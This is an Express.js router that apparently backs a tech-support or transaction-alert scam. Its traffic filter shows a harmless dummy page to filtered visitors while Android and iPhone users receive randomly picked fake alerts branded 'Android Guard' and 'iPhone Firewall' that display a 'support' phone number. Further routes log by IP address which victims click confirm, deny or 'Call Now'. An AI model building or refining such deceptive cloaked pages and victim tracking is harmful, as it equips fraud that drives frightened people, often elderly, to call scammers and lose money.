const express = require('express');
const router = express.Router();
const { trafficFilter } = require('../middleware/trafficFilter');
const TrafficLog = require('../models/TrafficLog');

// Design variants per device
const ANDROID_DESIGNS = [
  { view: 'android-secure',   title: 'Android Secure — Transaction Verification' },
  { view: 'android-material', title: 'Android Guard — Transaction Verification' }
];

const IPHONE_DESIGNS = [
  { view: 'iphone-firewall', title: 'iPhone Firewall — Transaction Verification' },
  { view: 'iphone-glass',    title: 'iOS Firewall — Transaction Alert' }
];

function randomPick(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

// Main endpoint — applies traffic filter
router.get('/endpoint', trafficFilter, (req, res) => {
  const result = req.trafficResult;

  if (result.blocked) {
    return res.render('dummy', {
      title: 'Transaction Verification'
    });
  }

  const phone = process.env.SUPPORT_NUMBER || '+18000000000';

  if (result.contentServed === 'android') {
    const design = randomPick(ANDROID_DESIGNS);
    return res.render(design.view, { title: design.title, phone });
  }

  if (result.contentServed === 'iphone') {
    const design = randomPick(IPHONE_DESIGNS);
    return res.render(design.view, { title: design.title, phone });
  }

  return res.render('dummy', { title: 'Transaction Verification' });
});

// ===== CONVERSION TRACKING API =====

// POST /api/convert — fired when user clicks Yes/No button
router.post('/api/convert', async (req, res) => {
  try {
    const { action } = req.body;
    if (!action || !['confirm', 'deny'].includes(action)) {
      return res.status(400).json({ error: 'Invalid action' });
    }

    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
      || req.headers['x-real-ip']
      || req.connection.remoteAddress
      || req.ip;
    const cleanIP = ip.replace('::ffff:', '');

    const log = await TrafficLog.findOne({
      ip: cleanIP,
      status: 'allowed',
      'conversion.action': null
    }).sort({ timestamp: -1 });

    if (!log) {
      return res.status(404).json({ error: 'No matching log found' });
    }

    log.conversion.action = action;
    log.conversion.actionAt = new Date();
    await log.save();

    return res.json({ ok: true, id: log._id });
  } catch (err) {
    console.error('[Convert] Error:', err.message);
    return res.status(500).json({ error: 'Server error' });
  }
});

// POST /api/convert/call — fired when user clicks "Call Now"
router.post('/api/convert/call', async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
      || req.headers['x-real-ip']
      || req.connection.remoteAddress
      || req.ip;
    const cleanIP = ip.replace('::ffff:', '');

    const log = await TrafficLog.findOne({
      ip: cleanIP,
      status: 'allowed',
      'conversion.action': { $ne: null },
      'conversion.callClicked': false
    }).sort({ timestamp: -1 });

    if (!log) {
      return res.status(404).json({ error: 'No matching log found' });
    }

    log.conversion.callClicked = true;
    log.conversion.callClickedAt = new Date();
    await log.save();

    return res.json({ ok: true, id: log._id });
  } catch (err) {
    console.error('[Convert/Call] Error:', err.message);
    return res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;
